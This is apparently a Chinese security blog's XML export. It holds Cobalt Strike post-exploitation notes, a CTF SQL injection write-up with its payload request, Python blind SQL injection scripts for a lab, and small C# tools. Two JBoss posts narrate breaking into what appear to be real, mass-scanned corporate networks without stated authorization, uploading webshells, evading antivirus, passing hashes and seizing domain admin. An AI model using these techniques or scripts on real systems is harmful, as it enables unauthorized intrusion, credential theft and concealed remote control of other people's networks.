        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【编程】C段 ping操作]]></title>
    <url>%2F2018%2F04%2F%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91C%E6%AE%B5ping%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[利用周末，造个轮子，学习C#！！ 官方examples查看官方的Ping类，已经很成熟了。以下为官方examples 1234567891011121314151617181920212223public static void Main (string[] args) &#123; Ping pingSender = new Ping (); PingOptions options = new PingOptions (); // Use the default Ttl value which is 128, // but change the fragmentation behavior. options.DontFragment = true; // Create a buffer of 32 bytes of data to be transmitted. string data = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa"; byte[] buffer = Encoding.ASCII.GetBytes (data); int timeout = 120; PingReply reply = pingSender.Send (args[0], timeout, buffer, options); if (reply.Status == IPStatus.Success) &#123; Console.WriteLine ("Address: &#123;0&#125;", reply.Address.ToString ()); Console.WriteLine ("RoundTrip time: &#123;0&#125;", reply.RoundtripTime); Console.WriteLine ("Time to live: &#123;0&#125;", reply.Options.Ttl); Console.WriteLine ("Don't fragment: &#123;0&#125;", reply.Options.DontFragment); Console.WriteLine ("Buffer size: &#123;0&#125;", reply.Buffer.Length); &#125; &#125; 运行结果： 修改数据显示官方demo中使用的是默认的Ttl（128），那接下来也使用这个默认值。对demo进行修改，显示所需要的信息即可。 123Console.WriteLine ("Address: &#123;0&#125;", reply.Address.ToString ());Console.WriteLine ("HostName: &#123;0&#125;", Dns.GetHostEntry(reply.Address.ToString()).HostName);Console.WriteLine ("Time to live: &#123;0&#125;", reply.Options.Ttl); 这只能识别windows系统的，毕竟是128。emmm。 正则匹配IP使用正则去匹配输入的IP地址是否合理。 123456// IP地址Regex regex = new Regex(@"\d+\.\d+\.\d+\.\d+");// (提取IP地址时有用)// IP地址Regex regex = new Regex(@"((?:(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d)\\.)&#123;3&#125;(?:25[0-5]|2[0-4]\\d|[01]?\\d?\\d))");// IP地址...... 调用处理： 效果： demo流程：输入–&gt; 判断IP格式（处理）–&gt;遍历（ToString）–&gt;Ping()–&gt;输出–&gt;结束 项目地址： 【参考】 https://msdn.microsoft.com/en-us/library/system.net.networkinformation.ping(v=vs.110).aspx]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>C#</tag>
        <tag>Tools</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【渗透技巧】Cobalt Strike 学习]]></title>
    <url>%2F2018%2F04%2F%E3%80%90%E6%B8%97%E9%80%8F%E6%8A%80%E5%B7%A7%E3%80%91Cobalt%20Strike%20%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[Cobalt Strike是一款非常优秀的后渗透平台，基于Java。 日常的【渗透技巧】Cobalt Strike 学习，Cobalt Strike提供的UI界面，使得很多操作都很容易理解，所以使得很多操作变得更加的简单。 监听器beacon 123是Cobalt Strike内嵌的监听器，也就是说，当在目标系统成功执行payload后，会弹会一个beacon的shell给Cobalt Strike，该shell所支持的通信协议主要包括dns、https、http、smp[pipe]。 实战中尽可能使用dns，或者，不用IP而使用域名。 foreign 123提供给外部使用的一些监听器，比如你想利用Cobalt Strike派生一个Meterpreter的shell进行内网渗透，这就需要用到foreign。 使用powershell第一种方式：在beacon shell中导入外部ps脚本到远程机器上 12powershell-import /root/Desktop/PowerView.ps1powershell Get-NetGroup -GroupName *admin* 第二种方式：在beacon shell中直接执行powershell代码 1powerpick Get-NetGroup socks为了让CS和msf互相间联通使用，在目标机器上开启socks4a代理。 [Beacon]–&gt;[Pivoting]–&gt;[SOCKS Server] 或者直接在beacon中执行socks post 第一种利用方式：利用各种socks代理客户端直接把各类渗透工具带进目标进网 123# vi /etc/proxychains.conf socks4 lhost 2333# proxychains msfconsole 第二种利用方式：直接利用隧道把整个msf带进目标内网 12# msfconsolesetg Proxies socks4:lhost:2333 SSH登陆 使用upload和download进行上传下载。也可以通过socks代理进行登陆。 权限提升[Beacon]–&gt;[access]–&gt;[Elevate] Cobalt Strike 内嵌了两个提权exp，ms14-058是个老提权漏洞利用方式，可利用于Windows 7系统。 uac-dll是一种Bypass UAC攻击，是由本地管理员运行payload从中等权限往最高权限提升的过程，适用于windows 7和windows 10。 可以通过导入cna文件进行丰富漏洞库。项目地址为：ElevateKit Spawn可使用spawn功能孵化出n个shell，shell与shell之间相当于以一种级联的形式存在。 作用：将公网某团队服务器的beacon shell 派生到本地团队服务器指定的监听器上，或是派生到msf。 派生至本地团队服务器 建立好监听器，返回到左边的公网团队服务器使用spawn功能，选择刚刚建立的监听器。 过一会儿就能看到shell被正常弹到本地团队服务器指定的监听器上。 派生至Meterpreter 在公网团队服务器上创建一个外部foreign监听器（本地msf与CS使用的协议无比相同） 横向移动 首先，要决定用哪种方法来横向移动（当前环境需要高度完整的管理员权限才能完成正常操作）。 如果想使用token作用于某个Beacon，那就选中当前会话的Token框， 如果想使用证书或哈希来横向移动，就从凭证存储库中选择凭据或填充用户、密码和域等字段，Beacon会将此信息作为需要的令牌。 选择用于横向移动的Listener，通常这个会选择使用HTTPS。 最后选择Session，这选项只需要选择同个内网机器Session即可（已上线）。 PS： Cobalt Strike的异步进攻模式要求每一次攻击都是以当前一个受损系统（已控）为跳板执行的。如果存在多台已控机器，则优先考虑Windows系统作为跳板机，且利用所有的凭证或哈希，攻击成功则会反馈在Beacon控制台中。 查看官方操作，与日常操作方式不太一样。 转发通过红色区域（指已获取beacon shell的机器）做一个重定向到蓝色区域（没有取得控制权的目标机器）有漏洞的机器。 查看说明 1234567beacon&gt; help rportfwdUse: rportfwd [bind port] [forward host] [forward port] rportfwd stop [bind port]Binds the specified port on the target host. When a connection comes in,Cobalt Strike will make a connection to the forwarded host/port and use Beaconto relay traffic between the two connections. 第一个参数为监听端口，第二个参数是转发主机和转发端口。注意：目标主机都会有防火墙拦截链接（弹框提示）。 becon shell 内置了端口转发功能，把本机的某个端口转发到公网（如3389）。 [Beacon]–&gt;[Pivoting]–&gt;[Listener] 接下来正常链接x.35这台的2333端口即可。 内网机器 在Beacon shell中建立一条新的监听规则。 12345beacon&gt; shell netstat -ano | findstr "7878"[*] Tasked beacon to run: netstat -ano | findstr "7878"[+] host called home, sent: 37 bytes[+] received output: TCP 0.0.0.0:7878 0.0.0.0:0 LISTENING 3516 在Cobalt Strike当中新建一个Listener，内容如图所示： 上线的Listener选择新建的rportfwd-listener即可。 黄金票据使用域管理员权限伪造一张黄金票据是最常见的方法。 制作黄金票据的前提条件： 想要伪造票据的用户 为其创建票据的域名 域的SID（whomai /user） 域控制器上krbtgt用户的NTLM哈希值 PS： 首先要使用klist /purge清除缓存的授权票据。 Malleable-C2自从Cobalt Strike更新至3.6版本后，官方给出了一个Malleable-C2，也就是在启动团队服务器（服务端）的时候加载一些配置文件，这是一个非常棒的功能，可以帮助我们伪装流量、SSL加密通讯，达到隐匿的效果，值得一用。 123cd /opt/cobaltstrike/git clone https://github.com/rsmudge/Malleable-C2-Profiles# 使用方法：./teamserver [external IP] [password] [/path/to/my.profile] 参考：Cobalt Strike-help]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>Tools</tag>
        <tag>渗透技巧</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【测试评估】JBoss引起的内网渗透 - 3]]></title>
    <url>%2F2018%2F03%2F%E3%80%90%E6%B5%8B%E8%AF%95%E8%AF%84%E4%BC%B0%E3%80%91JBoss%E5%BC%95%E8%B5%B7%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%20-%203%2F</url>
    <content type="text"><![CDATA[待人如知己！！！ 首先说明，这个系列的JBoss都是批量获取的，并不是针对某地区某组织而为。 WebShell如同上一篇文章获取，但是这次是直接上传jsp脚本文件，这样更加快捷。 信息收集123456789本机用户信息： %computername% --&gt; SZXzzAO-RxxxSY ifconfig --&gt; 192.168.140.171 %os% --&gt; Windows Server 2008 R2 x64 System Model --&gt; VMware Virtual Platform Statistiques depuis --&gt; 19/03/2018 15:00:18域情况： 存在域使用循环ping找出了50+台C段存活主机 翻阅目录 从用户目录来看，发现域管登录的痕迹； C盘根目录下有metasploit，创建时间为2016-04-19； 用户support用于黑客行为操作用户（CrackMapExec扫描日志等）； 在deploy\management存在大量后门文件； 在$Recycle.Bin存在已删除的恶意exe可执行文件； 存在Panda Security（熊猫卫士）文件夹 后门之多无法想象。 进程收集 存在PSANHost.exe（熊猫卫士） 大量的cmd.exe、powershell.exe及taskkill.exe 其他 screenshot –&gt; 锁屏 问题处理问题 上传的远控可执行文件运行无反应； 执行Desktop下的mimikatz.exe，一执行就消失（杀软？）； 使用powershell执行mimikatz获取hash，但密码为空（注册表被篡改了？）； 无法将自添加的用户加入管理员组； 无法执行net view等命令（net 系列缺失）。 分析 生成的马是免杀的（virustotal.com）； Panda动态查杀mimikatz； 存在KB2871997补丁（Administrator-500）； 执行命令无回显估计是因为地区语言的原因。 突破方法 生成新的CS马； 修改注册表； 使用PsExec进行hash注入； 对内网使用MS-17-010； 对内网的Web服务进行渗透。 横向拓展前奏反弹个metasploit的shell，利用smb进行主机识别。但是失败，估计是在添加路由的时候出现错误，导致访问不到它的内网段。 已知条件： 远控上线； SZXzzAO-RxxxSY各用户的hash。 定位想要横向，那就得需要知道域控为哪些，域管为哪些，域用户为哪些，内网机器存活为多少。这就关于到内网渗透定位技术问题。 常规的命令： 1234567net user /domain # 存在数据net view /domain # 该列表是空的net group /domain # 存在数据net group "domain admins" /domain # 无法找到组名称net time /domain # 存在数据net group "domain controllers" /domain # 无法找到组名称nltest /dclist:ALxxx.lxxxl # 存在数据 以下内容是以上信息的综合： 123域控： SZXDC01 --&gt; 192.168.140.10 SZXDC02 --&gt; 192.168.140.11 使用Cobalt Strike的ARP扫描（因为net view使用不了），使得Targets有记录。 接下来就是找域管理员，既然不知道组名称，那就先找组名，过程参考内网渗透测试定位技术总结。 完成！ 方法用比较典型的hash注入碰一下看看运气怎么样。由于存在KB2871997补丁，所以只能使用administrator用户进行注入。 登陆情况如下： 12345678192.168.140.10 # 失败192.168.140.11 # 失败192.168.140.14 # 成功....192.168.140.57 # 成功192.168.140.78 # 失败192.168.140.160 # 成功.... 这个过程就是不断的进行hash注入，不断的dump密码，结果就如上图。看Credentials里是否存在域管用户账密。 成功获取到域管的账号密码。进行登陆。]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>测试评估</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【测试评估】JBoss引起的内网渗透 - 2]]></title>
    <url>%2F2018%2F03%2F%E3%80%90%E6%B5%8B%E8%AF%95%E8%AF%84%E4%BC%B0%E3%80%91JBoss%E5%BC%95%E8%B5%B7%E7%9A%84%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%20-%202%2F</url>
    <content type="text"><![CDATA[待人如知己！！ 说明：本文中有个错误的概念验证，在判断域管理员的时候不能这么判断的，是不合理的。主要原因是在实操的时候，刚好能够使用Administrator用户密码登陆域，所以文章中就这么下结论了。这只是一个小概率事件，不成定律。 切入点Jboss的反序列化漏洞，接下来看站点信息 正常来说这个admin-console及web-console/都是能正常访问的，就算不能正常访问也不会是404状态 ，所以为了搞清楚原因，去翻了其目录，进行对比。发现 12server\default\deploy #默认部署war目录server\web\deploy # 部署war相对应的编译生成目录 两个目录中，在\web\deploy\中缺少了admin-console和web-console，所以原因是：管理员在安装了JBoss后，为了安全起见，就在server\web\deploy删除了admin-console.war和web-console.war，所以在部署目录下是存在war包，但是编译目录下是不存在的。 所以接下来就进行常规的war部署，发现war已经上传上去了，但是访问出现404，所以跑去server\web\deploy查看，发现是没有生成相对应的文件夹，原因暂时未知。 所以就直接将jsp脚本上传到了jmx-console.war当中，成功获取WebShell 12server\default\deploy\jmx-console.war\ # 上传访问失败server\web\deploy\jmx-console.war\ # 上传访问成功 信息收集接下来又是常规的信息收集 发现在菜刀里面执行命令，多数都是超时状态，所以还是回到之前的工具进行执行或是上传个命令执行马或是用web访问马。 进程里面是存在avguard.exe，所以需要做免杀。系统是windows xp-x86。 在查看环境变量的时候发现是存在powershell的,但是没起作用。 12345678910111213141516net user #查看本机用户-------------------------------------------------------------------------------Administrator Guest HelpAssistant postgres saverio SUPPORT_388945a0 net group "domain admins" /domain #查看域管理员-------------------------------------------------------------------------------Administrator bckagent dbagent faxmaker idsmessina lattuca SpaceGuardSvcAccnt trovato VMwareVDPBackupUser net group "domain controllers" /domain #查看域控制器-------------------------------------------------------------------------------DOMAIN1$ DOMAIN2$ 域用户就不列举了，实在有些多 信息收集到这里，就有些蹊跷，因为本机用户里面，除了Administrator存在于域用户中，其余的账户均不见，所以这里能直接判断Administrator就是域管理员。 综合以上信息： 1234DOMAIN2 - 192.168.20.10 # 域控制器PROTRIBUTCT -Administrator # 域管理员avguard.exe # 小红伞杀软powershell # 不可用 小小免杀续上次的shellter免杀，是过不了小红伞的，所以，这种时候，该储备的东西就起作用了。 生成一个Metasploit的马，去Virustotal做测试免杀，是过了AVG的，所以尝试一波。但是，生成的exe在windows 7下面是能正常执行的，但是到了xp上面就不行了。 用Veil生成个吧，安装Veil也是个大坑，图就不放了。 横向内网接下来思路就很明确了。将PROTRIBUTCT的密码dump下来，幸运的话整个域就能拿下来了。 至此，这个域已经拿下，比上篇难度相对来说要小一些。 还有一个点，就是在查看域控的时候发现是有两台的，也是一样的登陆方式进行登陆即可。但是在这两台域控执行net view /domain:xxxxx结果都是不一样的，这也许就是两台域控的缘故吧。但是DOMAIN1所在的段只能通过DOMAIN2出来，其他机器做跳板均没数据，或许这是玄学了吧。 至此，整个测试流程就结束了。整个过程有点顺利，不是我发blog的初衷。]]></content>
      <categories>
        <category>内网渗透</category>
      </categories>
      <tags>
        <tag>内网渗透</tag>
        <tag>测试评估</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【CTF】P牛的红包口令]]></title>
    <url>%2F2018%2F02%2F%E3%80%90CTF%E3%80%91P%E7%89%9B%E7%9A%84%E7%BA%A2%E5%8C%85%E5%8F%A3%E4%BB%A4%2F</url>
    <content type="text"><![CDATA[这个口令红包没领成。 新年新气象，逛圈子偶遇到P牛发的一个红包。 题目如下： 12018.mhz.pw:62231 信息获取使用浏览器访问题目，发现无法访问，且提示为ERR_INVALID_HTTP_RESPONSE，那就说明这个端口并不是HTTP协议的服务。 使用端口指纹识别： rsync是linux系统下的数据镜像备份工具。所以我们得去了解一下rsync的基本语法 12列远程机的文件列表。这类似于rsync传输，不过只要在命令中省略掉本地机信息即可。如：rsync -v rsync://2018.mhz.pw:62231从远程rsync服务器中拷贝文件到本地机。如：rsync -av rsync://2018.mhz.pw:62231/www /databack 源码拉取 将git裸仓库进行还原 1git clone pwnhub_6670.git/ 需要审计的源码还原成功，但是本地搭建没成功，得修改修改（环境问题）。 漏洞挖掘文件列表如下： 初略看了下，只有一个登录框。 那还是读源码吧。从index.php 跳转至cpre.php，先看这份PHP代码。 从开始都是一些常规的全局设置。再往下看。 目标站点只有简单的登陆功能，相关代码如下： 123456789101112131415161718192021222324252627escape($_REQUEST); # 转义escape($_POST);escape($_GET);function escape(&amp;$arg) &#123; if(is_array($arg)) &#123; # 判断$arg是否为数组 foreach ($arg as &amp;$value) &#123; # 遍历$arg数组。每次循环中，当前单元的值被赋给$value并且数组内部的指针向前移一步。 escape($value); &#125; &#125; else &#123; $arg = str_replace(["'", '\\', '(', ')'], ["‘", '\\\\', '（', '）'], $arg); # 将$arg内的单引号、小括号转换成中文符号，将反斜杠进行转义。 &#125;&#125;function arg($name, $default = null, $trim = false) &#123; if (isset($_REQUEST[$name])) &#123; # 检查$_REQUEST中是否存在$name值 $arg = $_REQUEST[$name]; &#125; elseif (isset($_SERVER[$name])) &#123; # 检查$_SERVER中是否存在$name值 $arg = $_SERVER[$name]; &#125; else &#123; $arg = $default; &#125; if($trim) &#123; $arg = trim($arg); &#125; return $arg;&#125; 在检测的$name值当中，$_SERVER很明显并没有被转义处理。或许我们能利用这一个点。 再往下看代码、来到了Controller类。分了BaseController.php和MainController.php，它们是继承关系。在MainController.php看到了三个函数。 123actionIndex() #主页actionLogin() #登陆 (正常验证)actionRegister() #注册 看到这里我才知道是有注册功能的。下面来看看actionRegister的代码： 123456789101112131415161718192021222324252627282930313233343536function actionRegister()&#123; if ($_POST) &#123; $username = arg('username'); # 检查是否存在 $password = arg('password'); if (empty($username) || empty($password)) &#123; # 判断用户密码是否为空 $this-&gt;error('Username or password is empty.'); &#125; $email = arg('email'); # 检查是否存在 if (empty($email)) &#123; # 如果email为空，则email由输入的用户名、@及HOST组合而成 $email = $username . '@' . arg('HTTP_HOST'); &#125; if (!filter_var($email, FILTER_VALIDATE_EMAIL)) &#123; # FILTER_VALIDATE_EMAIL过滤器 $this-&gt;error('Email error.'); &#125; $user = new User(); # 判断用户名是否存在 $data = $user-&gt;query("SELECT * FROM `&#123;$user-&gt;table_name&#125;` WHERE `username` = '&#123;$username&#125;'"); if ($data) &#123; $this-&gt;error('This username is exists.'); &#125; $ret = $user-&gt;create([ # 向users表中插入数据 'username' =&gt; $username, 'password' =&gt; md5($password), 'email' =&gt; $email ]); if ($ret) &#123; $_SESSION['user_id'] = $user-&gt;lastInsertId(); &#125; else &#123; $this-&gt;error('Unknown error.'); &#125; &#125;&#125; 能利用的点就是email的组成元素(HTTP_HOST)，而HTTP_HOST又是由arg函数获取的，也就是说可以从没有被转义的$_SERVER着手。既然是数据库操作，那就看看是否能构造语句使之形成SQL注入漏洞。 先明确一点：Email由用户名、@、Host三者拼接而成，而Host可利用的点为$_SERVER。 但是其中有个FILTER_VALIDATE_EMAIL过滤器，所以首先还是得绕过这个过滤器。 绕过过滤器第一次见到FILTER_VALIDATE_EMAIL是在PHPMailer的CVE-2016-10033里面遇到的，当时还是用着wordpress博客程序。 这样就能引入了引号，又符合过滤器的规则。那我们就传入用户名为&quot;qqq，Host为rcoil&#39;&quot;@rcoil.me进行注册。因为邮箱中包含单引号，所以必会造成SQL注入。 构造SQL注入将Host进行修改，结果如下： 404错误，并不是我们想象中的情景。之前做CTF的时候有过这类型的情况，添加多一个Host就可以了。如图： 既然构成了SQL注入，那就看看怎么利用了。 SQL注入在源码中有分sql备份文件，从里面能看到SQL的结构。 最后卡在了这个报错注入里面。 P牛的WriteUP攻击LNMP架构Web应用的几个小Tricks 知识点还是掌握得不够，静下心来好好学习。 看了P牛的WriteUp，才注意到create方法就是拼接了一个INSERT语句，而且报错信息也没仔细看。 现在回过头来想想，确实就是这么一回事。在插入的过程中，闭合了前段语句，再新建一个语句插入自己定义的语句，就能在可控的范围内获取自己所需要的信息。翻了翻之前的笔记。 123456789101112131415161718192021222324252627282930313233mysql&gt; use test;Database changedmysql&gt; SELECT @@version;+-----------+| @@version |+-----------+| 5.5.53 |+-----------+1 row in setmysql&gt; select * from demo;+------+------+------+| demo | test | aoao |+------+------+------+| d | d | d |+------+------+------+1 row in setmysql&gt; INSERT into demo VALUES('A','A','A'),('B','B','B');Query OK, 2 rows affectedRecords: 2 Duplicates: 0 Warnings: 0mysql&gt; select * from demo;+------+------+------+| demo | test | aoao |+------+------+------+| d | d | d || A | A | A || B | B | B |+------+------+------+4 rows in set 然后我们构造一下语句 1234567891011121314151617POST /main/register HTTP/1.1Host: 2018.mhz.pwHost: rcoil'),('ao123',md5(121314),(select(flag)from(flags)))#"@rcoil.meContent-Length: 34Cache-Control: max-age=0Origin: http://2018.mhz.pwUpgrade-Insecure-Requests: 1Content-Type: application/x-www-form-urlencodedUser-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://2018.mhz.pw/main/registerAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Cookie: PHPSESSID=bvdrraji3mjirt5noljghm8ib7Connection: closeusername="qq&amp;email=&amp;password=aaaaa 闭合了前段的INSERT语句，并新建了一条语句，在email字段将flag读取。]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>PHP</tag>
        <tag>Web安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【编程】编码转换工具]]></title>
    <url>%2F2018%2F01%2F%E3%80%90%E7%BC%96%E7%A8%8B%E3%80%91%E7%BC%96%E7%A0%81%E8%BD%AC%E6%8D%A2%E5%B7%A5%E5%85%B7%2F</url>
    <content type="text"><![CDATA[一直想写一些图形化工具来用。从小入手，写了个计算器，看了下代码，有点麻瓜。 12工具：【编程】编码转换工具编译：VS2015 C#(.NET Framework v4.0) 先看一下效果图： 其中有个bug，就是ASCii不归零，也不知道是怎么回事。 默认的textBox获取方式为Encoding.Default.GetBytes(str)，注意的是要使用UTF8，代码有些丑陋，就不贴了。 在写到Base32的时候，没找到现成的方法可以直接利用，所以就去了解了下、 Base32是由ABCDEFGHIJKLMNOPQRSTUVWXYZ234567组成的,由于0和1由于与字母O和I相似性而被跳过。 规则： 12任意给定一个二进制数据，以5个位(bit)为一组进行切分(base64以6个位(bit)为一组)对切分而成的每个组进行编码得到1个可见字符。 演示：（以rcoil字符串进行编码） 123字符rcoil取ASCII码之后，对其转换成二进制（切5补0）得到01110,01001,10001,10110,11110,11010,01011,01100计算每组二进制对应的十进制，然后参考Base32编码表，组成密文 具体的算法就是这样，有了流程就可以写代码了。 后来找了找，能找到一些别人已经写好的类。Base32 Decoding，直接利用就可以了。]]></content>
      <categories>
        <category>编程之道</category>
      </categories>
      <tags>
        <tag>C#</tag>
        <tag>Tools</tag>
        <tag>编程之道</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【知识回顾】MySQL-盲注浅析]]></title>
    <url>%2F2017%2F11%2F%E3%80%90%E7%9F%A5%E8%AF%86%E5%9B%9E%E9%A1%BE%E3%80%91MySQL-%E7%9B%B2%E6%B3%A8%E6%B5%85%E6%9E%90%2F</url>
    <content type="text"><![CDATA[起源是上交高校运维比赛（EIS_CTF）其中的一道盲注题，所以使用sqli-labs进行一个复习，权当是盲注的一个复习。 前言所有的测试均为无WAF的情况下进行。 注释关键字123-- # 单行注释，两个-连接符后面紧跟着一个空格# # 单行注释/**/ # 多行注释 实践效果：1234567891011121314151617mysql&gt; SELECT username,password FROM `users` WHERE id = '2'#' LIMIT 0,1; -&gt; ;+----------+------------+| username | password |+----------+------------+| Angelina | I-kill-you |+----------+------------+1 row in setmysql&gt; SELECT username,password FROM `users` WHERE id = '2'-- ' LIMIT 0,1; -&gt; ;+----------+------------+| username | password |+----------+------------+| Angelina | I-kill-you |+----------+------------+1 row in set 都是可以正常得到查询的结果说明后面的SQL语句已经被我们注释掉了 Sql注入截取字符串常用函数在不回显的情况下，多数情况下都会用到截取字符串的问题，也就是在盲注的情况下，需要一个一个字符的去猜解，其中就需要截取字符串。 mid()函数语法为：1SELECT MID(column_name,start[,length]) FROM table_name; column_name 必需。要提取字符的字段。 start 必需。规定开始位置（起始值是 1）。 length可选。要返回的字符数。如果省略，则 MID() 函数返回剩余文本。我们就直接使用sqli-labs的数据库进行演示。12345678database()为security mysql&gt; select mid(database(),1,4);+---------------------+| mid(database(),1,4) |+---------------------+| secu |+---------------------+1 row in set 其中column_name内容可为自行构造的sql语句。 substr()函数语法为：1SELECT SUBSTR(column_name,start[,length]) FROM table_name; 描述和用法与mid()函数是一样的1234567mysql&gt; select substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1);+--------------------------------------------------------------------------------------------------------+| substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1) |+--------------------------------------------------------------------------------------------------------+| e |+--------------------------------------------------------------------------------------------------------+1 row in set Left()函数语法为：1SELECT LEFT(ARG,LENGTH) FROM table_name; 取一个字符串的前若干位1234567mysql&gt; select left(database(),4);+--------------------+| left(database(),4) |+--------------------+| secu |+--------------------+1 row in set 布尔SQL盲注用sqli-labs的第6题作为例子 先手工fuzz一下。123http://192.168.2.100/sqli-labs/Less-6/?id=-1http://192.168.2.100/sqli-labs/Less-6/?id=1'http://192.168.2.100/sqli-labs/Less-6/?id=1" &quot;报错，继续fuzz12http://192.168.2.100/sqli-labs/Less-6/?id=1"and"1"="1http://192.168.2.100/sqli-labs/Less-6/?id=1"and"1"="2 存在注入，但是没有回显，判断为可盲注。测试一下(其实盲注的脚本真的就只是这几行，难度无非是在waf过滤函数的替换绕过)。123456789101112131415161718# ! usr/bin/env python# -*- coding: utf-8 -*-import requestsurl = 'http://192.168.2.100/sqli-labs/Less-6/?id=1"'print("获取数据库长度")for i in range(1, 32): payload = "and length(database())=%d--+" % i res = requests.get(url + payload) if "You are in..........." in res.text: print("[+]数据库长度为:" + str(i) + "位") break结果为/usr/bin/python2.7 /home/rcoil/PycharmProjects/demo/demo.py获取数据库长度[+]数据库长度为:8位Process finished with exit code 0 所以证明注入确实存在且为盲注,浏览器验证下。 获取数据库名字先测试（fuzz）发现是可行的。然后写脚本进行猜解。12345678910111213141516# ! usr/bin/env python# -*- coding: utf-8 -*-import requestsurl = 'http://192.168.2.100/sqli-labs/Less-6/?id=1"'print("获取数据库名字")database = ''for i in range(1, 10): for j in range(97, 123): payload = "and mid(database(),1,%d)='%s'--+" % (i, database + chr(j)) res = requests.get(url + payload) if "You are in..........." in res.text: database += chr(j) print("[-]当前猜解:" +database) breakprint("[+]当前数据库:" +database) 如果出现编码问题，要注意的是headers中Content-Type的值，必要的时候带入headers进行访问 获取表名1234567mysql&gt; select mid((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,2);+-----------------------------------------------------------------------------------------------------+| mid((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,2) |+-----------------------------------------------------------------------------------------------------+| em |+-----------------------------------------------------------------------------------------------------+1 row in set 所以接下来代码为123456789101112131415# ! usr/bin/env python# -*- coding: utf-8 -*-import requestsurl = 'http://192.168.2.100/sqli-labs/Less-6/?id=1"'table_names = ''for i in range(0, 8): for k in range(1, 32): for j in range(97, 123): payload = "and mid((select table_name from information_schema.tables where table_schema='security' limit %d,1),1,%d)='%s'--+" % (i, k, table_names+chr(j)) request = requests.get(url + payload) if "You are in" in request.text: table_names += chr(j) print("第" + str(i + 1) + "张表的名字为" + table_names) break 我发现，如果想要优雅一些，用ascii()或者改变k的位置比如1and ascii(mid((select table_name from information_schema.tables where table_schema='security' limit %d,1),%d,1))='%d'--+" % (i, k, j) 但是这样子的话，到最后，所有的table_names都拼接一起（后面补充）。 获取列名1234567mysql&gt; select mid((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 1,1),1,4);+------------------------------------------------------------------------------------------------------------------------------+| mid((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 1,1),1,4) |+------------------------------------------------------------------------------------------------------------------------------+| user |+------------------------------------------------------------------------------------------------------------------------------+1 row in set 代码和上面的没区别123456789101112131415# ! usr/bin/env python# -*- coding: utf-8 -*-import requestsurl = 'http://192.168.2.100/sqli-labs/Less-6/?id=1"'column_names = ''for i in range(0, 8): for k in range(1, 32): for j in range(97, 123): payload = "and ascii(mid((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit %d,1),%d,1))='%d'--+" % (i, k, j) request = requests.get(url + payload) if "You are in" in request.text: column_names += chr(j) print("第" + str(i + 1) + "列字段名为" + column_names) break 爆字段123456789101112131415# ! usr/bin/env python# -*- coding: utf-8 -*-import requestsurl = 'http://192.168.2.100/sqli-labs/Less-6/?id=1"'column_names = ''for i in range(0, 8): for k in range(1, 32): for j in range(21, 127): payload = "and ascii(mid((select username from security.users limit %d,1),%d,1))='%d'--+" % (i, k, j) request = requests.get(url + payload) if "You are in" in request.text: column_names += chr(j) print("第" + str(i + 1) + "行数据为" + column_names) break 这个布尔SQL盲注暂时分析到这里。如果想要一脚本搞定以上所有的内容，那就def一下就很方便调用了。写到这里的时候，我发现，所有的脚本都有很多的相同点，只需要更换变量就可以直接使用。而且，在去翻资料的过程中，我发现在bool盲注中二分法比穷举要快一些，所以我参照王一航的思路进行改写。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#!/usr/bin/env python# encoding:utf8import requestsimport sysurl = "http://192.168.2.100/sqli-labs/Less-6/?id="# 定义payloaddef exce(database_name, table_name, column_name, Result, Char, mid): global url esndStr = " and\"1\"=\"1" payload = "1\"and(ascii(mid((select " + column_name + " from " + database_name + "." + table_name + " limit " + Result + ",1)," + Char + ",1))&gt;" + mid + ")" tempurl = url + payload + esndStr request = requests.get(tempurl).text if "You are in..........." in request: return True else: return False# 二分查询def doubleSearch(database_name, table_name, column_name, Result, Char, left_number, right_number): while left_number &lt; right_number: mid = int((left_number + right_number) / 2) if exce(database_name, table_name, column_name, str(Result),str(Char + 1),str(mid)): left_number = mid else: right_number = mid if right_number-left_number == 1: if exce(database_name, table_name, column_name, str(Result),str(Char + 1),str(mid)): mid += 1 break else: break return chr(mid)# 定义所有变量初始def getAllData(database_name, table_name, column_name): for i in range(32): counter = 0 for j in range(32): counter += 1 temp = doubleSearch(database_name, table_name, column_name, i, j, 0, 127) # 从255开始查询 if ord(temp) == 1: break sys.stdout.write(temp) sys.stdout.flush() if counter == 1: break sys.stdout.write("\r\n") sys.stdout.flush()def getAllSchemaNames(): return getAllData(column_name="schema_name", table_name="schemata", database_name="information_schema")getAllSchemaNames() 